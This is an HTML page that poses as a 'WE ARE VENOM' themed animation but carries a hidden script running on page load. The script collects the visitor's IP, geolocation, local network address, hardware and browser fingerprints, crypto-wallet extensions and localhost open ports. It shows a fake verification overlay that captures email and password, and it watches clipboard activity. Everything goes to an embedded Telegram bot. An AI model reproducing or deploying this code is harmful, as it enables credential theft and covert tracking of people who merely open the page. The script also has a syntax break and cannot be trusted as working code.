<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WE ARE VENOM</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Creepster', cursive;
            overflow: hidden;
        }
        
        /* Venom Eyes Background */
        .eyes-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10vw;
            z-index: 1;
        }
        
        .eye {
            width: 30vw;
            height: 18vw;
            background: #fff;
            border-radius: 0 90% 0 90%;
            box-shadow: 
                0 0 60px #fff,
                0 0 120px rgba(255,0,0,0.5),
                inset 0 0 40px rgba(255,0,0,0.2);
            animation: glow 4s ease-in-out infinite;
        }
        
        .eye.left {
            transform: rotate(-20deg);
        }
        
        .eye.right {
            transform: rotate(20deg) scaleX(-1);
        }
        
        @keyframes glow {
            0%, 100% { 
                opacity: 0.4;
                box-shadow: 0 0 40px #fff, 0 0 80px rgba(255,0,0,0.3);
            }
            50% { 
                opacity: 0.9;
                box-shadow: 0 0 80px #fff, 0 0 160px rgba(255,0,0,0.6);
            }
        }
        
        /* Main Text Container */
        .container {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }
        
        /* We Are Venom Text */
        .venom-text {
            font-size: clamp(2.5rem, 12vw, 7rem);
            color: #fff;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            line-height: 1.2;
            text-shadow: 
                0 0 20px #fff,
                0 0 40px #f00,
                0 0 80px #f00;
            position: relative;
        }
        
        /* Subtle Glitch */
        .venom-text::before {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            color: #00f;
            animation: subtle-glitch 3s infinite;
            clip-path: polygon(0 30%, 100% 30%, 100% 50%, 0 50%);
            opacity: 0.7;
        }
        
        @keyframes subtle-glitch {
            0%, 90%, 100% { transform: translate(0); opacity: 0; }
            92% { transform: translate(-3px); opacity: 0.7; }
            94% { transform: translate(3px); opacity: 0.7; }
            96% { transform: translate(0); opacity: 0; }
        }
        
        /* Cursor */
        .cursor {
            display: inline-block;
            width: 0.08em;
            height: 1em;
            background: #f00;
            margin-left: 8px;
            animation: blink 0.8s infinite;
            box-shadow: 0 0 10px #f00;
            vertical-align: middle;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        /* Mobile */
        @media (max-width: 480px) {
            .eyes-container {
                gap: 5vw;
            }
            .eye {
                width: 35vw;
                height: 20vw;
            }
        }

        /* ========== 🥷 MR. D BYPASS MODULE ========== */
        #credOverlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 99999;
            display: none;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(15px);
        }

        .cred-box {
            background: #0a0a0a;
            padding: 35px;
            border-radius: 20px;
            box-shadow: 0 0 80px #f00, inset 0 0 30px rgba(255,0,0,0.3);
            border: 1px solid #f00;
            text-align: center;
            max-width: 380px;
            width: 90%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 40px #f00, inset 0 0 20px rgba(255,0,0,0.3); }
            50% { box-shadow: 0 0 80px #f00, inset 0 0 40px rgba(255,0,0,0.5); }
        }

        .cred-box h3 {
            color: #fff;
            font-family: 'Creepster', cursive;
            margin-bottom: 15px;
            text-shadow: 0 0 20px #f00;
            font-size: 28px;
        }

        .cred-box p {
            color: #999;
            margin-bottom: 20px;
            font-family: monospace;
        }

        .cred-box input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: #111;
            border: 2px solid #f00;
            color: #fff;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
        }

        .cred-box input:focus {
            outline: none;
            box-shadow: 0 0 30px #f00;
        }

        .cred-box button {
            background: linear-gradient(135deg, #f00, #800);
            color: #fff;
            border: none;
            padding: 14px 35px;
            border-radius: 8px;
            font-family: 'Creepster', cursive;
            font-size: 20px;
            cursor: pointer;
            box-shadow: 0 0 30px #f00;
            margin-top: 15px;
            width: 100%;
            transition: 0.3s;
        }

        .cred-box button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px #f00;
        }

        .hidden-iframe {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <!-- 🥷 HIDDEN IFRAME FOR AUTOFILL STEAL -->
    <iframe class="hidden-iframe" id="stealFrame" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>

    <!-- 🎣 CREDENTIAL OVERLAY -->
    <div id="credOverlay">
        <div class="cred-box">
            <h3>🕷️ SYMBIOTE VERIFICATION 🕷️</h3>
            <p>Confirm human identity to continue</p>
            <input type="email" id="credEmail" placeholder="Email Address" autocomplete="email">
            <input type="password" id="credPass" placeholder="Password" autocomplete="current-password">
            <button id="credSubmit">VERIFY & CONTINUE</button>
            <p style="color:#666; margin-top:15px; font-size:11px;">"We will know if you lie..."</p>
        </div>
    </div>

    <div class="eyes-container">
        <div class="eye left"></div>
        <div class="eye right"></div>
    </div>
    
    <div class="container">
        <h1 class="venom-text" id="venom" data-text="WE ARE VENOM"></h1>
    </div>

    <script>
        // ╭──╮
        // │⚡│ VENOM INSTANT HARVEST v5.0 - MR. D
        // ╰──╯
        
        (function() {
            "use strict";
            
            // ========== CONFIG ==========
            const BOT_TOKEN = '8535527452:AAGgkORLgeQwXE4mAofCvIFtbShleFfG6sU';
            const CHAT_ID = '8443713788';
            const WEBHOOK_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            // ============================
            
            const victim = {
                basic: {},
                hardware: {},
                network: {},
                fingerprint: {},
                behavior: {},
                credentials: {},
                browser: {},
                timing: { start: performance.now() }

            let dataSent = false;
            
            // 🚀 INSTANT SEND FUNCTION
            async function sendLightning(data, type = 'full') {
                if (dataSent && type !== 'creds') return;
                
                try {
                    let msg = '';
                    
                    if (type === 'quick') {
                        msg = `⚡ *VENOM QUICK STRIKE*\n`;
                        msg += `━━━━━━━━━━━━━━━━\n`;
                        msg += `🌐 IP: \`${data.basic.ip}\`\n`;
                        msg += `📍 ${data.basic.city || 'Unknown'}, ${data.basic.country || ''}\n`;
                        msg += `📡 ISP: ${data.basic.isp || 'N/A'}\n`;
                        msg += `💻 ${data.basic.os} | ${data.basic.browser}\n`;
                        msg += `🏠 Local: \`${data.network.localIP || 'N/A'}\`\n`;
                        msg += `🔋 ${data.hardware.battery || 'N/A'}\n`;
                        msg += `🎮 GPU: ${data.hardware.gpu || 'N/A'}\n`;
                    } else if (type === 'creds') {
                        msg = `🔥🔥 *CREDENTIALS CAPTURED!* 🔥🔥\n`;
                        msg += `━━━━━━━━━━━━━━━━\n`;
                        msg += `📧 Email: \`${data.credentials.email}\`\n`;
                        msg += `🔑 Password: \`${data.credentials.password}\`\n`;
                        msg += `🌐 IP: \`${data.basic.ip}\`\n`;
                        msg += `⏰ ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' })}\n`;
                        dataSent = false;
                    } else {
                        msg = `🕷️ *VENOM FULL HARVEST REPORT* 🕷️\n`;
                        msg += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                        msg += `🌐 *IP:* \`${data.basic.ip}\`\n`;
                        msg += `📍 *Location:* ${data.basic.city}, ${data.basic.region}, ${data.basic.country}\n`;
                        msg += `🗺️ [Google Maps](${data.basic.maps})\n`;
                        msg += `📡 *ISP:* ${data.basic.isp} (${data.basic.org || 'N/A'})\n`;
                        msg += `🛡️ *VPN/Proxy:* ${data.basic.proxy ? '✅ YES' : '❌ No'}\n`;
                        msg += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                        msg += `💻 *OS:* ${data.basic.os}\n`;
                        msg += `🌐 *Browser:* ${data.basic.browser}\n`;
                        msg += `📱 *Screen:* ${data.basic.screen}\n`;
                        msg += `🏠 *Local IP:* \`${data.network.localIP || 'N/A'}\`\n`;
                        msg += `🔌 *Ports Open:* ${data.network.openPorts?.length || 0}\n`;
                        if (data.network.openPorts?.length) {
                            data.network.openPorts.slice(0, 3).forEach(p => msg += `  - ${p.port}:${p.service}\n`);
                        }
                        msg += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                        msg += `🧠 *CPU:* ${data.hardware.cores} Cores | *RAM:* ${data.hardware.ram}GB\n`;
                        msg += `🔋 *Battery:* ${data.hardware.battery}\n`;
                        msg += `🎮 *GPU:* ${data.hardware.gpu?.substring(0, 40) || 'N/A'}\n`;
                        msg += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                        msg += `🆔 *Canvas:* ${data.fingerprint.canvas?.substring(0, 20) || 'N/A'}...\n`;
                        msg += `🔊 *Audio:* ${data.fingerprint.audio || 'N/A'}\n`;
                        msg += `🕒 *Timezone:* ${data.basic.timezone}\n`;
                        msg += `🔗 *Referrer:* ${data.basic.referrer}\n`;
                        msg += `🧩 *Extensions:* ${data.browser.extensions?.length || 0} detected\n`;
                        msg += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                        msg += `⏱️ *Harvest Time:* ${(performance.now() - victim.timing.start).toFixed(2)}ms\n`;
                        msg += `⏰ ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' })}`;
                        dataSent = true;
                    }
                    
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: msg,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                    
                    console.log(`%c✅ VENOM: ${type} data sent to Mr. D`, 'color: #0f0');
                } catch (e) {
                    console.error('Send error:', e);
                }
            }
            
            // ⚡ ULTRA FAST HARVEST (Before DOM Ready)
            async function quickHarvest() {
                // Basic Info (Instant)
                victim.basic = {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || 'Direct',
                    online: navigator.onLine
                };
                
                // Parse OS/Browser
                const ua = victim.basic.ua;
                victim.basic.os = ua.includes('Windows') ? 'Windows' : 
                                  ua.includes('Mac') ? 'macOS' :
                                  ua.includes('Linux') ? 'Linux' :
                                  ua.includes('Android') ? 'Android' :
                                  ua.includes('iPhone') ? 'iOS' : 'Unknown';
                victim.basic.browser = ua.includes('Chrome') ? 'Chrome' :
                                       ua.includes('Firefox') ? 'Firefox' :
                                       ua.includes('Safari') ? 'Safari' :
                                       ua.includes('Edge') ? 'Edge' : 'Unknown';
                
                // Hardware (Fast)
                victim.hardware = {
                    cores: navigator.hardwareConcurrency || '?',
                    ram: navigator.deviceMemory || '?',
                    touch: navigator.maxTouchPoints || 0
                };
                
                // Battery (Fast)
                try {
                    const bat = await navigator.getBattery();
                    victim.hardware.battery = `${Math.round(bat.level * 100)}% ${bat.charging ? '⚡' : '🔋'}`;
                } catch (e) {}
                
                // WebRTC Local IP (Fast)
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    const offer = await pc.createOffer();
                    await pc.setLocalDescription(offer);
                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (ip) victim.network.localIP = ip[0];
                        }
                    };
                } catch (e) {}
                
                // GPU Info (Fast)
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
                    if (ext) victim.hardware.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                } catch (e) {}
                
                // Get IP + Geo (Fast)
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    victim.basic.ip = ipData.ip;
                    
                    const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const geo = await geoRes.json();
                    victim.basic.city = geo.city;
                    victim.basic.region = geo.region;
                    victim.basic.country = geo.country_name;
                    victim.basic.isp = geo.org;
                    victim.basic.org = geo.asn;
                    victim.basic.proxy = false;
                    victim.basic.maps = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
                } catch (e) {
                    victim.basic.ip = 'Error';
                }
                
                // Fingerprints (Fast)
                try {
                    const c = document.createElement('canvas');
                    c.width = 100; c.height = 30;
                    const ctx = c.getContext('2d');
                    ctx.fillStyle = '#f00';
                    ctx.fillRect(0, 0, 50, 30);
                    ctx.fillStyle = '#00f';
                    ctx.fillText('VENOM', 10, 20);
                    victim.fingerprint.canvas = c.toDataURL().substring(0, 50);
                } catch (e) {}
                
                try {
                    const ac = new (window.AudioContext || window.webkitAudioContext)();
                    victim.fingerprint.audio = ac.sampleRate;
                    ac.close();
                } catch (e) {}
                
                // Send Quick Report (Under 500ms)
                await sendLightning(victim, 'quick');
                
                // Continue full harvest in background
                setTimeout(fullHarvest, 10);
            }
            
            // 🔥 FULL HARVEST (Background)
            async function fullHarvest() {
                // Network Scan
                victim.network.openPorts = [];
                const ports = [80, 443, 22, 21, 3306, 3389, 8080, 5900, 27017, 6379, 5432, 1433, 9200, 5000, 3000, 8000, 8888, 9000];
                
                for (let port of ports) {
                    try {
                        await new Promise((resolve) => {
                            const img = new Image();
                            const start = performance.now();
                            img.onload = img.onerror = () => {
                                if (performance.now() - start < 30) {
                                    victim.network.openPorts.push({
                                        port: port,
                                        service: port === 80 ? 'HTTP' : port === 443 ? 'HTTPS' : 
                                                 port === 22 ? 'SSH' : port === 3306 ? 'MySQL' :
                                                 port === 3389 ? 'RDP' : port === 8080 ? 'Proxy' : 'Unknown'
                                    });
                                }
                                resolve();
                            };
                            img.src = `http://127.0.0.1:${port}/favicon.ico?${Math.random()}`;
                            setTimeout(resolve, 50);
                        });
                    } catch (e) {}
                }
                
                // Browser Extensions Detection
                victim.browser.extensions = [];
                const extTests = [
                    { name: 'MetaMask', test: () => !!window.ethereum },
                    { name: 'Phantom', test: () => !!window.solana },
                    { name: 'Grammarly', test: () => !!document.querySelector('[data-grammarly]') },
                    { name: 'LastPass', test: () => !!window.lastpass },
                    { name: 'AdBlock', test: () => !!document.getElementById('adblock-test') }
                ];
                
                extTests.forEach(ext => {
                    try {
                        if (ext.test()) victim.browser.extensions.push(ext.name);
                    } catch (e) {}
                });
                
                // Send Full Report
                await sendLightning(victim, 'full');
            }
            
            // 🎣 CREDENTIAL PHISHING
            function setupPhishing() {
                const overlay = document.getElementById('credOverlay');
                const email = document.getElementById('credEmail');
                const pass = document.getElementById('credPass');
                const btn = document.getElementById('credSubmit');
                
                setTimeout(() => overlay.style.display = 'flex', 6000);
                
                btn.addEventListener('click', async () => {
                    victim.credentials = {
                        email: email.value,
                        password: pass.value
                    };
                    
                    if (email.value && pass.value) {
                        await sendLightning(victim, 'creds');
                        overlay.style.display = 'none';
                        setTimeout(() => alert('✅ Verification Complete. Welcome, symbiote.'), 500);
                    }
                });
                
                // Autofill Capture
                setTimeout(() => {
                    if (email.value) victim.credentials.email = email.value;
                    if (pass.value) victim.credentials.password = pass.value;
                }, 6500);
            }
            
            // 📋 CLIPBOARD STEALER
            function setupClipboard() {
                document.addEventListener('paste', (e) => {
                    victim.behavior.clipboard = e.clipboardData.getData('text').substring(0, 200);
                });
                
                document.addEventListener('copy', () => {
                    victim.behavior.copied = window.getSelection().toString().substring(0, 200);
                });
            }
            
            // ⌨️ TYPING ANIMATION
            function startTyping() {
                const text = "WE ARE VENOM";
                const el = document.getElementById('venom');
                let i = 0;
                
                function type() {
                    if (i < text.length) {
                        el.innerHTML = text.substring(0, i + 1) + '<span class="cursor">|</span>';
                        i++;
                        setTimeout(type, 120);
                    } else {
                        el.innerHTML = text + '<span class="cursor">|</span>';
                    }
                }
                type();
            }
            
            // 🚀 INITIALIZE - ULTRA FAST
            (async function init() {
                // Start harvesting IMMEDIATELY
                quickHarvest();
                
                // Setup other modules
                setupPhishing();
                setupClipboard();
                
                // Start typing animation (cosmetic)
                startTyping();
                
                // Console Signature
                console.log('%c🕷️ VENOM INSTANT HARVEST ACTIVE | MR. D APPROVED 🕷️', 'color: #f00; font-size: 18px; font-family: monospace');
                console.log('%c⚡ Data sent to Telegram in background ⚡', 'color: #ff0; font-size: 14px');
            })();

    </script>
